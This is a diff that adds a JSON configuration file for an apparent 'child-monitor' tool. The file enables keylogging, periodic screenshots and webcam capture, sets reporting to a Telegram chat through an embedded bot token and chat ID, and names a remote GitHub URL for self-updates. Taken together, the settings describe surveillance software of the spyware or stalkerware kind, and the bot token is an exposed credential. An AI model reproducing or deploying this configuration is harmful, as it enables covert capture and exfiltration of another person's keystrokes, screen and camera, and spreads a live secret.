@@ -1,0 +1,22 @@
+{
+  "telegram_bot_token": "8769415154:AAHvACXi9Urn1H6pcCCWQwgaTV6QqR8leOc",
+  "telegram_chat_id": "-5107824487",
+  "report_interval_seconds": 60,
+  "screenshot_interval_seconds": 60,
+  "screenshot_enabled": true,
+  "keylog_enabled": true,
+  "camera_enabled": true,
+  "camera_interval_seconds": 300,
+  "update_url": "https://raw.githubusercontent.com/lyhotuanlinh2399-cmd/child-monitor/main/",
+  "webrtc": {
+    "signaling_server": "ws://127.0.0.1:8765",
+    "viewer_base_url": "http://127.0.0.1:8088",
+    "ice_servers": [
+      { "urls": "stun:stun.l.google.com:19302" },
+      { "urls": "stun:stun.cloudflare.com:3478" }
+    ],
+    "target_fps": 60,
+    "max_fps": 120,
+    "video_codec": "h264"
+  }
+}
